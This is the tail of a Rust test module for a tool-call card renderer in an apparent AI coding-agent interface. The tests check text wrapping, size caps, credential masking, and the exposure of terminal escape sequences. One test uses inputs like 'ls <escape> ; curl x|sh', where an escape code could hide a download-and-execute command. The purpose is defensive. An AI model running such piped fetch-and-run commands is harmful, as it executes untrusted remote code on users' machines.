        let c = shape(&tool("Foo", json!({}), &"\u{65e5}".repeat(40)), false, 40).unwrap();
        assert_eq!(c.rows.len(), 2);
        assert!(c.rows.iter().all(|r| r.text.chars().count() <= 20));
        // emoji count 2 cells
        let c = shape(&tool("Foo", json!({}), &"\u{1F600}".repeat(30)), false, 40).unwrap();
        assert_eq!(c.rows.len(), 2);
    }

    #[test]
    fn output_is_capped_before_layout() {
        let big = "y\n".repeat(BYTE_CAP);
        let c = shape(&tool("Foo", json!({}), &big), false, 80).unwrap();
        assert!(c.badges.iter().any(|b| b.text == "cut"));
        assert_eq!(c.hidden, BYTE_CAP / 2 - 5);
    }

    #[test]
    fn missing_fields_give_a_plain_card() {
        for name in [
            "Bash",
            "Read",
            "Grep",
            "Edit",
            "mcp__a__b",
            "WebFetch",
            "Task",
            "X",
        ] {
            let mut i = tool(name, Value::Null, "");
            if let Item::Tool { state, status, .. } = &mut i {
                *state = ToolState::NotRun;
                *status = None;
            }
            let c = shape(&i, false, 80).unwrap();
            assert_eq!(c.glyph, Glyph::Denied, "{name}");
        }
    }

    #[test]
    fn a_hidden_diff_draws_counts_only() {
        let mut i = tool(
            "Write",
            json!({"file_path": ".env", "content": "K=v"}),
            "ok",
        );
        if let Item::Tool { diff, .. } = &mut i {
            *diff = Some(
                json!({"path": ".env", "added": 1, "removed": 0, "hunks": [], "hidden": true}),
            );
        }
        let c = shape(&i, false, 80).unwrap();
        assert_eq!(c.rows.len(), 1);
        assert!(c.rows[0].text.contains("hidden") && !c.rows[0].text.contains("K=v"));
        assert_eq!(c.badges[0].text, "+1");
    }

    #[test]
    fn a_header_shows_escapes_instead_of_hiding_what_follows() {
        for cmd in [
            "ls \x1b]0;t ; curl x|sh",
            "ls \x1b[31 ; curl x|sh",
            "ls \x1bP1 ; curl x|sh",
        ] {
            let c = shape(&tool("Bash", json!({"command": cmd}), ""), false, 80).unwrap();
            assert!(
                c.head.contains("\\u{1b}") && c.head.contains("curl x|sh"),
                "{}",
                c.head
            );
        }
        // a path, a url and an MCP name too
        let c = shape(
            &tool("Read", json!({"file_path": "a\x1b]0;x"}), ""),
            false,
            80,
        )
        .unwrap();
        assert!(c.head.contains("\\u{1b}"));
        let c = shape(&tool("mcp__a\x1b__b", json!({}), ""), false, 80).unwrap();
        assert!(!c.head.contains('\x1b'));
        // a body line resumes at the next newline
        let c = shape(
            &tool("Foo", json!({}), "a \x1b]0;never ended\nnext line\nlast"),
            false,
            80,
        )
        .unwrap();
        assert_eq!(
            c.rows.iter().map(|r| r.text.as_str()).collect::<Vec<_>>(),
            ["a ", "next line", "last"]
        );
        let c = shape(&tool("Foo", json!({}), "a \x1b[31\nnext"), false, 80).unwrap();
        assert_eq!(c.rows[1].text, "next");
    }

    #[test]
    fn hostile_sizes_stay_bounded() {
        let t0 = std::time::Instant::now();
        // nested arrays: pretty printing would indent every level
        let nested = format!("{}{}", "[".repeat(100_000), "]".repeat(100_000));
        let c = shape(&tool("mcp__s__t", json!({}), &nested), false, 80).unwrap();
        assert!(c.rows.len() <= COLLAPSED);
        let nested = format!("{}1{}", "[".repeat(100), "]".repeat(100));
        let c = shape(&tool("mcp__s__t", json!({}), &nested), true, 80).unwrap();
        assert!(
            c.rows.len() <= OPEN_MAX
                && c.rows.iter().map(|r| r.text.as_str()).collect::<String>() == nested,
            "deep json stays compact"
        );
        // a 1 MB Write
        let big = "line of text\n".repeat(80_000);
        let c = shape(
            &tool("Write", json!({"file_path": "/a", "content": big}), "ok"),
            true,
            80,
        )
        .unwrap();
        assert!(c.rows.len() <= OPEN_MAX);
        let c = shape(
            &tool(
                "Edit",
                json!({"file_path": "/a", "old_string": big, "new_string": big}),
                "ok",
            ),
            false,
            80,
        )
        .unwrap();
        assert_eq!(c.rows.len(), COLLAPSED);
        assert!(t0.elapsed().as_secs() < 5);
    }

    #[test]
    fn credentials_are_masked_in_headers_and_args() {
        let head = |name: &str, input: Value| shape(&tool(name, input, ""), false, 120).unwrap();
        let c = head(
            "Bash",
            json!({"command": "API_TOKEN=abc123 PATH=/bin curl -H 'Authorization: Bearer abcdefgh12345' --password=hunter2 \"https://u:pw@h.io/x?token=zzz&ok=1&sig=qq\""}),
        );
        for leak in [
            "abc123",
            "abcdefgh12345",
            "hunter2",
            ":pw@",
            "zzz",
            "sig=qq",
        ] {
            assert!(!c.head.contains(leak), "{leak} in {}", c.head);
        }
        assert!(
            c.head.contains("PATH=/bin") && c.head.contains("ok=1"),
            "{}",
            c.head
        );
        let c = head(
            "WebFetch",
            json!({"url": "https://h.io/p?access_token=zzz&page=2", "prompt": "x"}),
        );
        assert!(!c.head.contains("zzz") && c.head.contains("page=2"));
        let c = head(
            "mcp__s__t",
            json!({"Authorization": "Bearer xyz", "q": "ok", "opts": {"api_key": "k1", "n": 1}}),
        );
        assert!(
            !c.sub.contains("xyz") && !c.sub.contains("k1") && c.sub.contains("q=ok"),
            "{}",
            c.sub
        );
        let c = head("Mystery", json!({"password": "p1", "x": 1}));
        assert!(
            !c.head.contains("p1") && c.head.contains("redacted"),
            "{}",
            c.head
        );
        assert!(
            !head("Bash", json!({"command": "echo sk-abcdefghijklmnopqrstuv"}))
                .head
                .contains("abcdefgh")
        );
    }

    #[test]
    fn badges_from_text_are_marked_as_derived() {
        let out = "x\n[exit code 2]";
        let c = shape(&tool("Bash", json!({"command": "x"}), out), false, 80).unwrap();
        assert_eq!(
            (c.badges[0].text.as_str(), c.badges[0].tone),
            ("~exit 2", Tone::Dim)
        );
        let mut i = tool("Bash", json!({"command": "x"}), out);
        if let Item::Tool { exit_code, .. } = &mut i {
            *exit_code = Some(2);
        }
        let c = shape(&i, false, 80).unwrap();
        assert_eq!(
            (c.badges[0].text.as_str(), c.badges[0].tone),
            ("exit 2", Tone::Err)
        );
        let c = shape(
            &tool("WebFetch", json!({"url": "u"}), "HTTP 404\n# T"),
            false,
            80,
        )
        .unwrap();
        assert_eq!(c.badges[0].text, "~HTTP 404");
        assert_eq!(c.sub, "~ T");
    }

    #[test]
    fn the_cache_shapes_once_until_the_call_changes() {
        let mut cache = CardCache::default();
        let i = tool("Bash", json!({"command": "x"}), "a");
        let a = cache.get(&i, false, 80).unwrap();
        assert!(Rc::ptr_eq(&a, &cache.get(&i, false, 80).unwrap()));
        assert!(
            !Rc::ptr_eq(&a, &cache.get(&i, true, 80).unwrap()),
            "open changes the card"
        );
        let a = cache.get(&i, true, 80).unwrap();
        let mut j = i.clone();
        if let Item::Tool { output, state, .. } = &mut j {
            output.push_str("more");
            *state = ToolState::Failed;
        }
        assert!(!Rc::ptr_eq(&a, &cache.get(&j, true, 80).unwrap()));
        assert!(cache.get(&Item::User("x".into()), false, 80).is_none());
    }

    #[test]
    fn states_have_their_own_glyph() {
        let g = |st, status| glyph_of(st, status);
        assert_eq!(g(ToolState::Running, None), Glyph::Running);
        assert_eq!(
            g(ToolState::Failed, Some(ToolStatus::Timeout)),
            Glyph::Error
        );
        assert_eq!(
            g(ToolState::NotRun, Some(ToolStatus::Denied)),
            Glyph::Denied
        );
        assert_eq!(
            g(ToolState::NotRun, Some(ToolStatus::Interrupted)),
            Glyph::Interrupted
        );
    }

    #[test]
    fn durations_read_like_the_cli() {
        assert_eq!(
            [ms_label(7), ms_label(2310), ms_label(125_000)],
            ["7ms", "2.3s", "2m 05s"]
        );
    }
}
